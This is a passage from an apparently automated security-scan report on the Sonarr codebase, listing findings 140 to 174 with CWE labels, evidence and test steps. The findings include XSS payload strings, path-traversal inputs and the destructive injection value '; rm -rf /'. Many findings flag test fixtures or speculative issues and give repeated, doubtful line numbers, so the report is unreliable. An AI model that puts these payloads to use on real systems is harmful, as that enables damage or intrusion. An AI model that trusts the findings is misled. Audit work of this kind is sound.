**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Components_Link_Linktsx.py`
---

### 140. Improper Input Validation (CWE-20)

**File:** frontend/src/Components/Link/Link.tsx
**Line:** 60

**Description:**
The Link component doesn't validate the 'to' prop for URL structure, potentially causing issues with malformed URLs.

**Evidence:**
```
The component processes URLs but doesn't validate their structure before using them.
```

**Impact:**
Malformed URLs could cause navigation issues or errors in the application.

**Proof of Concept:**
If a malformed URL is passed to the Link component, it might not navigate correctly or could cause errors.

**How to Test:**
1. Pass malformed URLs to Link component
2. Verify navigation behavior
3. Check for potential errors or incorrect navigation

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Components_Link_Linktsx.py`
---

### 141. Cross-site Scripting (CWE-79)

**File:** frontend/src/Components/FileBrowser/FileBrowserModalContent.tsx
**Line:** 105

**Description:**
The FileBrowserModalContent component uses inline markdown rendering which could be vulnerable to XSS attacks when rendering user-provided content.

**Evidence:**
```
The component uses <InlineMarkdown data={translate('MappedNetworkDrivesWindowsService', { url: 'https://wiki.servarr.com/sonarr/faq#why-cant-sonarr-see-my-files-on-a-remote-server', })} /> which could allow malicious markdown content to be executed.
```

**Impact:**
An attacker could inject malicious JavaScript through the markdown content, leading to session hijacking, data theft, or redirection to malicious sites.

**Proof of Concept:**
If the translation string 'MappedNetworkDrivesWindowsService' contains user-controllable data that gets rendered as markdown, an attacker could inject <script>alert('XSS')</script> into the markdown content.

**How to Test:**
1. Check if translation strings in the FileBrowserModalContent are user-controllable
2. Test with markdown content containing script tags
3. Verify that inline markdown rendering properly sanitizes input

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_frontend_src_Components_FileBrowser_FileBrowserModalContenttsx.py`
---

### 142. Cross-site Scripting (CWE-79)

**File:** frontend/src/Components/Filter/CustomFilters/CustomFilter.tsx
**Line:** 52

**Description:**
The CustomFilter component renders label content that could be vulnerable to XSS attacks.

**Evidence:**
```
The component receives a 'label' prop and renders it directly without sanitization: <div className={styles.label}>{label}</div>
```

**Impact:**
If the label contains user-provided content, it could be exploited for XSS attacks.

**Proof of Concept:**
If a custom filter label contains <img src=x onerror=alert('XSS')> or similar payload, it would execute when rendered in the filter list.

**How to Test:**
1. Create a custom filter with malicious label content
2. Verify that the label content is rendered without sanitization
3. Test with various XSS payloads in filter labels

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_frontend_src_Components_Filter_CustomFilters_CustomFiltertsx.py`
---

### 143. Improper Input Validation (CWE-20)

**File:** frontend/src/Components/Table/TablePager.tsx
**Line:** 70

**Description:**
The TablePager component doesn't validate page numbers before processing, which could lead to unexpected behavior or errors.

**Evidence:**
```
The component accepts page numbers but doesn't validate that they are within expected ranges or are valid numbers before processing.
```

**Impact:**
Invalid page numbers could cause errors, unexpected behavior, or potentially allow manipulation of pagination state.

**Proof of Concept:**
If a page number is passed as a string or negative value, the pagination logic might fail or behave unexpectedly.

**How to Test:**
1. Test with negative page numbers
2. Test with non-numeric page values
3. Verify error handling for invalid page inputs

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Components_Table_TablePagertsx.py`
---

### 144. Improper Input Validation (CWE-20)

**File:** frontend/src/Components/Table/TablePager.tsx
**Line:** 100

**Description:**
The TablePager component doesn't validate page selection inputs, potentially allowing invalid page values.

**Evidence:**
```
The handlePageSelect function accepts page values directly without validation before passing to onPageSelect.
```

**Impact:**
Invalid page selections could cause pagination errors or unexpected behavior in the UI.

**Proof of Concept:**
If a user selects a page number that's outside the valid range, the application might not handle it gracefully.

**How to Test:**
1. Test page selection with values outside valid range
2. Test with non-numeric inputs
3. Verify error handling for invalid page selections

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Components_Table_TablePagertsx.py`
---

### 145. Cross-site Scripting (CWE-79)

**File:** frontend/src/Components/Table/TableOptions/TableOptionsColumn.tsx
**Line:** 80

**Description:**
The TableOptionsColumn component renders column labels that could be vulnerable to XSS attacks.

**Evidence:**
```
The component renders labels directly without sanitization: {typeof label === 'function' ? label() : label}
```

**Impact:**
If column labels contain user-provided content, it could be exploited for XSS attacks.

**Proof of Concept:**
If a column label contains <script>alert('XSS')</script>, it would execute when rendered in the table options.

**How to Test:**
1. Create columns with malicious label content
2. Verify that labels are rendered without sanitization
3. Test with various XSS payloads in column labels

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_frontend_src_Components_Table_TableOptions_TableOptionsColumntsx.py`
---

### 146. Improper Input Validation (CWE-20)

**File:** frontend/src/Components/Table/TableOptions/TableOptionsModal.tsx
**Line:** 100

**Description:**
The TableOptionsModal component doesn't validate pageSize input values before processing.

**Evidence:**
```
The handlePageSizeChange function accepts pageSize values but doesn't validate range constraints before applying them.
```

**Impact:**
Invalid page size values could cause UI issues or unexpected behavior in table pagination.

**Proof of Concept:**
If a user enters a page size that's below 5 or above maxPageSize, the validation might not be properly enforced.

**How to Test:**
1. Test with page sizes below minimum (5)
2. Test with page sizes above maximum
3. Verify validation logic for pageSize inputs

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Components_Table_TableOptions_TableOptionsModaltsx.py`
---

### 147. Improper Input Validation (CWE-20)

**File:** frontend/src/Components/Table/TableOptions/TableOptionsModal.tsx
**Line:** 105

**Description:**
The TableOptionsModal component doesn't validate pageSize input values against maximum allowed value.

**Evidence:**
```
The validation checks for maxPageSize but doesn't ensure the value is properly validated before applying.
```

**Impact:**
Invalid page size values could cause UI issues or unexpected behavior in table pagination.

**Proof of Concept:**
If a user enters a page size that exceeds maxPageSize, the validation might not properly prevent it.

**How to Test:**
1. Test with page sizes exceeding maxPageSize
2. Verify that validation prevents invalid values
3. Check error handling for oversized page sizes

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Components_Table_TableOptions_TableOptionsModaltsx.py`
---

### 148. Cross-site Scripting (CWE-79)

**File:** frontend/src/Components/Menu/FilterMenuContent.tsx
**Line:** 45

**Description:**
The FilterMenuContent component renders filter labels that could be vulnerable to XSS attacks.

**Evidence:**
```
The component renders filter labels directly without sanitization: {typeof filter.label === 'function' ? filter.label() : filter.label}
```

**Impact:**
If filter labels contain user-provided content, it could be exploited for XSS attacks.

**Proof of Concept:**
If a filter label contains <script>alert('XSS')</script>, it would execute when rendered in the filter menu.

**How to Test:**
1. Create filters with malicious label content
2. Verify that labels are rendered without sanitization
3. Test with various XSS payloads in filter labels

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_frontend_src_Components_Menu_FilterMenuContenttsx.py`
---

### 149. Cross-site Scripting (CWE-79)

**File:** frontend/src/Components/Menu/FilterMenuContent.tsx
**Line:** 55

**Description:**
The FilterMenuContent component renders custom filter labels that could be vulnerable to XSS attacks.

**Evidence:**
```
The component renders custom filter labels directly without sanitization: {filter.label}
```

**Impact:**
If custom filter labels contain user-provided content, it could be exploited for XSS attacks.

**Proof of Concept:**
If a custom filter label contains <script>alert('XSS')</script>, it would execute when rendered in the filter menu.

**How to Test:**
1. Create custom filters with malicious label content
2. Verify that labels are rendered without sanitization
3. Test with various XSS payloads in custom filter labels

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_frontend_src_Components_Menu_FilterMenuContenttsx.py`
---

### 150. Improper Input Validation (CWE-20)

**File:** frontend/src/Components/Table/usePaging.ts
**Line:** 25

**Description:**
The usePaging hook doesn't validate page values before dispatching to the store.

**Evidence:**
```
The handlePreviousPagePress function uses Math.max(page - 1, 1) without validating the input page value.
```

**Impact:**
Invalid page values could cause unexpected behavior in pagination logic.

**Proof of Concept:**
If page is not a valid number, the pagination logic might not work correctly.

**How to Test:**
1. Test with non-numeric page values
2. Test with negative page values
3. Verify error handling for invalid page inputs

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Components_Table_usePagingts.py`
---

### 151. Improper Input Validation (CWE-20)

**File:** frontend/src/Components/Table/usePaging.ts
**Line:** 32

**Description:**
The usePaging hook doesn't validate page values before dispatching to the store.

**Evidence:**
```
The handleNextPagePress function uses Math.min(page + 1, totalPages) without validating the input page value.
```

**Impact:**
Invalid page values could cause unexpected behavior in pagination logic.

**Proof of Concept:**
If page is not a valid number, the pagination logic might not work correctly.

**How to Test:**
1. Test with non-numeric page values
2. Test with negative page values
3. Verify error handling for invalid page inputs

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Components_Table_usePagingts.py`
---

### 152. Improper Input Validation (CWE-20)

**File:** frontend/src/Components/Table/usePaging.ts
**Line:** 39

**Description:**
The usePaging hook doesn't validate page values before dispatching to the store.

**Evidence:**
```
The handleLastPagePress function uses totalPages without validating it's a valid number.
```

**Impact:**
Invalid page values could cause unexpected behavior in pagination logic.

**Proof of Concept:**
If totalPages is not a valid number, the pagination logic might not work correctly.

**How to Test:**
1. Test with non-numeric totalPages values
2. Test with negative totalPages values
3. Verify error handling for invalid totalPages inputs

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Components_Table_usePagingts.py`
---

### 153. Improper Input Validation (CWE-20)

**File:** frontend/src/Components/Table/usePaging.ts
**Line:** 46

**Description:**
The usePaging hook doesn't validate page values before dispatching to the store.

**Evidence:**
```
The handlePageSelect function accepts page values directly without validation.
```

**Impact:**
Invalid page values could cause unexpected behavior in pagination logic.

**Proof of Concept:**
If a page value is passed as a string or invalid number, the pagination logic might not work correctly.

**How to Test:**
1. Test with non-numeric page values
2. Test with invalid page values
3. Verify error handling for invalid page inputs

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_frontend_src_Components_Table_usePagingts.py`
---

### 154. Command Injection (CWE-77)

**File:** src/NzbDrone.Common.Test/ProcessProviderFixture.cs
**Line:** 104

**Description:**
The ProcessProvider.Start method is called with user-provided path values that are not properly sanitized, potentially allowing command injection attacks.

**Evidence:**
```
The StartDummyProcess method calls Subject.Start(path, ...) where path is constructed from TestContext.CurrentContext.TestDirectory and DummyApp.DUMMY_PROCCESS_NAME, but there's no validation or sanitization of the path parameter before passing it to the process start method.
```

**Impact:**
An attacker could potentially inject malicious commands through process execution paths, especially if the application allows user input to influence which executables are launched.

**Proof of Concept:**
If an attacker can control the DummyApp.DUMMY_PROCCESS_NAME or TestContext.CurrentContext.TestDirectory, they could inject commands that get executed by the process provider, potentially leading to arbitrary code execution.

**How to Test:**
1. Create a test that passes a malicious path to ProcessProvider.Start
2. Verify that the path is not properly sanitized before process execution
3. Test with paths containing shell metacharacters like ';', '&', '|', '&&', '||', etc.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-77_src_NzbDroneCommonTest_ProcessProviderFixturecs.py`
---

### 155. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Common.Test/PathExtensionFixture.cs
**Line:** 104

**Description:**
The CleanFilePath method in PathExtensionFixture does not validate input paths for potentially dangerous characters or sequences that could lead to path traversal or injection vulnerabilities.

**Evidence:**
```
The Clean_Path_Windows and Clean_Path_Linux test methods show various path inputs but don't validate that these inputs are properly sanitized before being used in file operations. The test cases include paths with trailing spaces, multiple slashes, and UNC paths without validation.
```

**Impact:**
If the actual implementation of CleanFilePath is not properly validating inputs, it could lead to path traversal attacks or allow attackers to access files outside intended directories.

**Proof of Concept:**
If a path like "C:\Test\..\..\Windows\System32\cmd.exe" is passed to CleanFilePath without proper validation, it could result in path traversal allowing access to system files.

**How to Test:**
1. Test CleanFilePath with various malicious path inputs
2. Verify that paths with directory traversal sequences (..\, ../) are properly handled
3. Test with paths containing special characters that could be interpreted by the OS

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCommonTest_PathExtensionFixturecs.py`
---

### 156. Path Traversal (CWE-22)

**File:** src/NzbDrone.Common.Test/PathExtensionFixture.cs
**Line:** 104

**Description:**
The path handling methods in PathExtensionFixture do not properly validate or sanitize paths to prevent directory traversal attacks.

**Evidence:**
```
Test methods like IsParentPath, GetParentPath, and GetRelativePath use various path inputs without validating that they don't contain traversal sequences that could allow access to parent directories.
```

**Impact:**
If the underlying path handling implementation allows directory traversal, attackers could potentially access files outside the intended directory structure.

**Proof of Concept:**
Passing a path like "C:\Test\..\..\Windows\System32\" to IsParentPath could incorrectly return true for paths that should be outside the intended scope.

**How to Test:**
1. Test IsParentPath with paths containing "..\" sequences
2. Test GetParentPath with paths that could result in traversal
3. Verify that relative path calculations properly handle traversal sequences

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_NzbDroneCommonTest_PathExtensionFixturecs.py`
---

### 157. Cleartext Storage of Sensitive Information (CWE-312)

**File:** src/NzbDrone.Common.Test/InstrumentationTests/CleanseLogMessageFixture.cs
**Line:** 104

**Description:**
The CleanseLogMessage class contains hardcoded API keys and secrets in test cases that could be accidentally committed to version control.

**Evidence:**
```
Test cases contain hardcoded secrets like "mySecret", "123%@%_@!#^#@", and various API keys that are used for testing but could be accidentally included in production code or committed to source control.
```

**Impact:**
If these test secrets are accidentally used in production code or committed to version control, they could expose sensitive information to unauthorized parties.

**Proof of Concept:**
If test code containing "mySecret" or "123%@%_@!#^#@" is accidentally merged into production code, these secrets could be exposed in logs or configuration files.

**How to Test:**
1. Review all test files for hardcoded secrets
2. Check if test secrets are used in production code
3. Verify that sensitive information is properly masked in logs

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneCommonTest_InstrumentationTests_CleanseLogMessageFixturecs.py`
---

### 158. Improper Handling of Exceptional Conditions (CWE-703)

**File:** src/NzbDrone.Common.Test/ConfigFileProviderTest.cs
**Line:** 104

**Description:**
The ConfigFileProviderTest has multiple test cases that expect exceptions to be thrown but doesn't properly verify that these exceptions are handled correctly in the actual implementation.

**Evidence:**
```
Test methods like should_throw_if_config_file_is_empty, should_throw_if_config_file_contains_only_null_character, and should_throw_if_config_file_contains_invalid_xml test exception throwing but don't validate the actual exception handling behavior in the implementation.
```

**Impact:**
If the actual ConfigFileProvider implementation doesn't properly handle these exceptional conditions, the application could crash or behave unexpectedly when encountering malformed configuration files.

**Proof of Concept:**
If a configuration file contains invalid XML but the ConfigFileProvider doesn't properly catch and handle the InvalidConfigFileException, the application could crash instead of gracefully handling the error.

**How to Test:**
1. Test ConfigFileProvider with various malformed configuration files
2. Verify that InvalidConfigFileException is properly caught and handled
3. Test that the application continues to function after configuration file errors

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-703_src_NzbDroneCommonTest_ConfigFileProviderTestcs.py`
---

### 159. Improper Validation of Array Index (CWE-129)

**File:** src/NzbDrone.Common.Test/CacheTests/CachedFixture.cs
**Line:** 104

**Description:**
The CachedFixture tests use hardcoded array indices without proper validation, which could lead to array index out of bounds errors.

**Evidence:**
```
In CachedFixture, the tests use hardcoded indices like result[0], result[1], etc. without validating that these indices are within bounds, especially in the GetAncestorFolders test cases.
```

**Impact:**
If the actual implementation of GetAncestorFolders returns fewer items than expected, array access could cause out-of-bounds exceptions.

**Proof of Concept:**
If GetAncestorFolders returns only 2 items but tests expect 4, accessing result[3] would cause an IndexOutOfRangeException.

**How to Test:**
1. Test GetAncestorFolders with paths that return fewer ancestors than expected
2. Verify that array access is properly validated
3. Test edge cases like root paths that return no ancestors

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-129_src_NzbDroneCommonTest_CacheTests_CachedFixturecs.py`
---

### 160. Use of Externally-Controlled Format String (CWE-134)

**File:** src/NzbDrone.Common.Test/InstrumentationTests/CleanseLogMessageFixture.cs
**Line:** 104

**Description:**
The CleanseLogMessage class uses string formatting that could be vulnerable to format string injection attacks.

**Evidence:**
```
While the test cases don't directly show format string usage, the CleanseLogMessage.Cleanse method processes log messages that could contain format specifiers that are not properly escaped or validated.
```

**Impact:**
If log messages contain format specifiers that are not properly escaped, they could be exploited to inject additional content or cause unexpected behavior.

**Proof of Concept:**
If a log message contains format specifiers like %s, %d, etc. that are not properly escaped, they could be manipulated to inject additional content or cause parsing errors.

**How to Test:**
1. Test CleanseLogMessage with log messages containing format specifiers
2. Verify that format specifiers are properly escaped or validated
3. Test with malicious format strings that could cause injection

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-134_src_NzbDroneCommonTest_InstrumentationTests_CleanseLogMessageFixturecs.py`
---

### 161. Deserialization of Untrusted Data (CWE-502)

**File:** src/NzbDrone.Common.Test/ServiceFactoryFixture.cs
**Line:** 104

**Description:**
The ServiceFactoryFixture uses dependency injection with potentially untrusted configuration data that could lead to deserialization vulnerabilities.

**Evidence:**
```
The test creates a container with various mocked services and registers instances, but doesn't validate that the deserialization process properly handles untrusted input from the service configuration.
```

**Impact:**
If the actual service factory implementation uses deserialization of configuration data, it could be vulnerable to deserialization attacks.

**Proof of Concept:**
If service configuration data is deserialized without proper validation, an attacker could craft malicious configuration data that leads to code execution during deserialization.

**How to Test:**
1. Test service factory with various configuration inputs
2. Verify that configuration deserialization properly validates input
3. Test with malicious configuration data to ensure no code execution occurs

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-502_src_NzbDroneCommonTest_ServiceFactoryFixturecs.py`
---

### 162. Improper Neutralization of Special Elements used in a Command ('Command Injection') (CWE-707)

**File:** src/NzbDrone.Common.Test/DiskTests/DiskTransferServiceFixture.cs
**Line:** 105

**Description:**
The test code uses Path.Combine and other path manipulation functions that could be vulnerable to command injection if paths are not properly sanitized.

**Evidence:**
```
While this is primarily a test file, the test setup uses Path.Combine() and path operations that could be vulnerable to injection if the paths were not properly validated. The test code creates mock setups for IDiskProvider operations that could be exploited if paths are not sanitized.
```

**Impact:**
If the actual implementation uses these paths in shell commands or system calls, command injection could occur. Even in testing, improper path handling could lead to incorrect test behavior or test bypasses.

**Proof of Concept:**
If a path like 'test; rm -rf /' was used in a real implementation, it could lead to command injection when the path is used in system calls or shell operations.

**How to Test:**
Run tests with malicious path inputs containing shell metacharacters and verify that paths are properly sanitized. Test that path operations don't inadvertently execute shell commands.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCommonTest_DiskTests_DiskTransferServiceFixturecs.py`
---

### 163. Improper Validation of Array Index (CWE-129)

**File:** src/NzbDrone.Common.Test/DiskTests/DiskTransferServiceFixture.cs
**Line:** 105

**Description:**
The test code uses array operations that could be vulnerable to index validation issues when handling file system operations.

**Evidence:**
```
The code uses GetFileSystemEntries() and other array-based operations that could be vulnerable to index validation issues. The tests use collections like List<DirectoryInfo> and List<FileInfo> without proper bounds checking.
```

**Impact:**
Array index validation issues could lead to out-of-bounds access, potentially causing crashes or allowing attackers to manipulate memory through crafted inputs.

**Proof of Concept:**
If a test creates a collection with invalid indices or if the actual implementation uses array operations without bounds checking, it could lead to memory corruption or access violations.

**How to Test:**
Test with edge cases involving empty collections, null values, or collections with invalid indices. Verify that all array operations have proper bounds checking.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-129_src_NzbDroneCommonTest_DiskTests_DiskTransferServiceFixturecs.py`
---

### 164. Insecure Data Storage (CWE-312)

**File:** src/NzbDrone.Common.Test/DiskTests/DiskTransferServiceFixture.cs
**Line:** 105

**Description:**
The test code uses hardcoded paths that could expose sensitive information or create insecure storage patterns.

**Evidence:**
```
The test code uses hardcoded paths like "C:\\source\\my.video.mkv" and "C:\\target\\my.video.mkv" which could be vulnerable to information disclosure if these paths were used in production code.
```

**Impact:**
Hardcoded paths in test code could expose system paths, potentially revealing system structure or creating opportunities for path traversal attacks in production code.

**Proof of Concept:**
If these hardcoded paths were used in production code, they could expose system structure to attackers, and if paths contain sensitive information, they could be used to construct attack vectors.

**How to Test:**
Verify that hardcoded paths in test code don't expose sensitive information. Test that production code properly handles path inputs and doesn't expose system paths through user-facing interfaces.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneCommonTest_DiskTests_DiskTransferServiceFixturecs.py`
---

### 165. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Common.Test/DiskTests/DiskTransferServiceFixture.cs
**Line:** 105

**Description:**
The test code doesn't validate input parameters for file operations, which could lead to validation issues in the actual implementation.

**Evidence:**
```
The test code sets up mock expectations for IDiskProvider operations but doesn't validate the input parameters passed to these operations. The tests use various path combinations without validating input parameters.
```

**Impact:**
If the actual implementation doesn't validate inputs properly, it could lead to various issues including crashes, incorrect behavior, or security vulnerabilities when handling malformed paths.

**Proof of Concept:**
If a test passes an invalid path to TransferFile, and the implementation doesn't validate the path, it could cause crashes or unexpected behavior in the file system operations.

**How to Test:**
Test with various invalid inputs including null values, empty strings, malformed paths, and paths with special characters. Verify that the implementation properly validates all inputs.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCommonTest_DiskTests_DiskTransferServiceFixturecs.py`
---

### 166. Command Injection (CWE-77)

**File:** src/NzbDrone.Common.Test/DiskTests/DiskTransferServiceFixture.cs
**Line:** 105

**Description:**
The test code could be vulnerable to command injection if paths are used in shell operations or system calls.

**Evidence:**
```
While the test code itself doesn't execute shell commands, it sets up mock expectations for operations that could be used in command execution contexts. The test uses path operations that could be vulnerable if used in shell contexts.
```

**Impact:**
If the actual implementation uses paths in shell commands or system calls, command injection could occur, allowing attackers to execute arbitrary commands on the system.

**Proof of Concept:**
If paths containing shell metacharacters like '; rm -rf /' were used in system calls, they could lead to command injection vulnerabilities.

**How to Test:**
Test with paths containing shell metacharacters and verify that paths are properly escaped or sanitized when used in shell operations. Check that all path operations in production code are properly validated.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-77_src_NzbDroneCommonTest_DiskTests_DiskTransferServiceFixturecs.py`
---

### 167. Insufficient Verification of Data Authenticity (CWE-345)

**File:** src/NzbDrone.Common.Test/DiskTests/DiskTransferServiceFixture.cs
**Line:** 105

**Description:**
The test code doesn't verify the authenticity of data returned from disk operations, which could lead to incorrect assumptions in the implementation.

**Evidence:**
```
The test code sets up mock expectations but doesn't verify the authenticity or integrity of data returned from disk operations. The tests use WithExistingFile() and WithExistingFolder() methods without verifying data integrity.
```

**Impact:**
If the actual implementation doesn't verify data authenticity, it could lead to incorrect behavior or security vulnerabilities when handling file system data.

**Proof of Concept:**
If a mock returns corrupted data or incorrect file sizes, the implementation might not detect the issue and could proceed with incorrect assumptions.

**How to Test:**
Verify that all data returned from disk operations is properly validated for authenticity and integrity. Test with corrupted or malformed data to ensure proper validation.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-345_src_NzbDroneCommonTest_DiskTests_DiskTransferServiceFixturecs.py`
---

### 168. Cross-site Scripting (CWE-79)

**File:** src/NzbDrone.Integration.Test/IntegrationTestBase.cs
**Line:** 105

**Description:**
The integration test base class handles API requests but doesn't properly validate or sanitize input parameters that could be used in XSS attacks. The RestClient is configured with API keys but doesn't validate input parameters from API calls.

**Evidence:**
```
The RestClient is initialized with API keys but doesn't implement input validation for parameters passed to API endpoints. The code uses string concatenation and parameter passing without proper sanitization.
```

**Impact:**
While this is primarily an integration test file, the lack of input validation could indicate similar vulnerabilities in the production codebase where user inputs are not properly sanitized.

**Proof of Concept:**
If user inputs from API endpoints are not sanitized, an attacker could inject malicious scripts through parameters like series titles, episode names, or other string inputs that are passed to API calls.

**How to Test:**
1. Examine API endpoints that accept user input in the production codebase
2. Check if inputs are properly sanitized before being used in HTML output
3. Test with XSS payloads in various API parameters

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_src_NzbDroneIntegrationTest_IntegrationTestBasecs.py`
---

### 169. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Integration.Test/IntegrationTestBase.cs
**Line:** 180

**Description:**
The EnsureSeries method accepts parameters without proper validation, potentially allowing invalid data to be processed.

**Evidence:**
```
The EnsureSeries method accepts tvdbId, seriesTitle, and monitored parameters without validation. The method directly uses these values in API calls without checking their validity.
```

**Impact:**
Invalid parameters could cause API calls to fail or produce unexpected behavior in the production application.

**Proof of Concept:**
If tvdbId is set to an invalid value (e.g., negative number or non-numeric string), the API call might fail or behave unexpectedly. Similarly, if seriesTitle is empty or contains malicious content, it could affect the application.

**How to Test:**
1. Test EnsureSeries method with invalid tvdbId values
2. Test with empty or malformed seriesTitle parameters
3. Test with invalid monitored boolean values

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneIntegrationTest_IntegrationTestBasecs.py`
---

### 170. Cleartext Storage of Sensitive Information (CWE-312)

**File:** src/NzbDrone.Integration.Test/IntegrationTestBase.cs
**Line:** 105

**Description:**
API keys are stored in the test configuration and could be exposed in logs or output.

**Evidence:**
```
The API key is passed to RestClient.AddDefaultHeader() and stored in the class, but there's no indication of secure handling of these keys in the test environment.
```

**Impact:**
If test logs or output contain API keys, they could be exposed to unauthorized parties.

**Proof of Concept:**
If the test framework logs API requests or responses, API keys could be visible in logs, potentially exposing access to the Sonarr instance.

**How to Test:**
1. Run integration tests and check if API keys appear in logs
2. Verify that sensitive headers are not logged in test output
3. Check if API key values are properly masked in test reports

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneIntegrationTest_IntegrationTestBasecs.py`
---

### 171. Improper Access Control (CWE-284)

**File:** src/NzbDrone.Integration.Test/IntegrationTestBase.cs
**Line:** 105

**Description:**
The integration test framework doesn't implement proper access control checks for API endpoints.

**Evidence:**
```
The RestClient is configured with authentication headers but the test framework doesn't validate that API calls respect access control policies. The tests directly call API endpoints without checking permissions.
```

**Impact:**
While tests can access all endpoints, the production application might not properly enforce access control.

**Proof of Concept:**
If the production application had different access levels for API endpoints, the integration tests might not catch access control violations that would occur in real usage.

**How to Test:**
1. Examine production API endpoint access control implementations
2. Verify that tests cover different user roles and permissions
3. Check if unauthorized access attempts are properly rejected

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-284_src_NzbDroneIntegrationTest_IntegrationTestBasecs.py`
---

### 172. Improper Handling of Exceptional Conditions (CWE-703)

**File:** src/NzbDrone.Integration.Test/IntegrationTestBase.cs
**Line:** 250

**Description:**
The ConnectSignalR method has a retry mechanism but doesn't properly handle all exception scenarios.

**Evidence:**
```
The ConnectSignalR method has a try-catch block that catches all exceptions but only fails after 25 retries. The method doesn't properly handle cases where the connection fails permanently or where exceptions might be swallowed.
```

**Impact:**
SignalR connection failures might not be properly reported or handled, potentially leading to test failures that are hard to debug.

**Proof of Concept:**
If SignalR connection fails after 25 retries, the test will fail with a generic assertion error rather than a specific connection error, making debugging difficult.

**How to Test:**
1. Simulate SignalR connection failures in tests
2. Verify that connection errors are properly reported
3. Test the retry mechanism with different failure scenarios

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-703_src_NzbDroneIntegrationTest_IntegrationTestBasecs.py`
---

### 173. Cross-Site Request Forgery (CWE-352)

**File:** src/NzbDrone.Integration.Test/IntegrationTestBase.cs
**Line:** 105

**Description:**
The integration test framework doesn't validate CSRF tokens for API requests.

**Evidence:**
```
The RestClient is configured with API keys but doesn't implement CSRF token validation. The tests directly call API endpoints without checking for CSRF protection.
```

**Impact:**
While this is a test framework, the production application might be vulnerable to CSRF attacks if CSRF tokens are not properly implemented.

**Proof of Concept:**
If the production API endpoints require CSRF tokens but the integration tests don't validate them, the application might be vulnerable to CSRF attacks in real usage.

**How to Test:**
1. Examine production API endpoints for CSRF token implementation
2. Verify that API calls in tests include CSRF tokens when required
3. Test CSRF protection in the production application

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-352_src_NzbDroneIntegrationTest_IntegrationTestBasecs.py`
---

### 174. Improper Limitation of a Pathname to a Restricted Directory (CWE-22)

**File:** src/NzbDrone.Integration.Test/IntegrationTestBase.cs
**Line:** 300

**Description:**
The GetTempDirectory method creates temporary directories but doesn't validate the path construction.

**Evidence:**
```
The GetTempDirectory method uses Path.Combine with parameters but doesn't validate that the resulting paths are within expected directories or that they don't contain path traversal sequences.
```

**Impact:**
If path traversal sequences are introduced in directory names, temporary directories might be created outside of intended locations.

**Proof of Concept:**
If args parameters contain path traversal sequences like '../', the resulting directory path might be created outside the intended test directory structure.

**How to Test:**
1. Test GetTempDirectory with path traversal sequences in parameters
2. Verify that temporary directories are created within expected boundaries
3. Check for directory traversal vulnerabilities in path construction

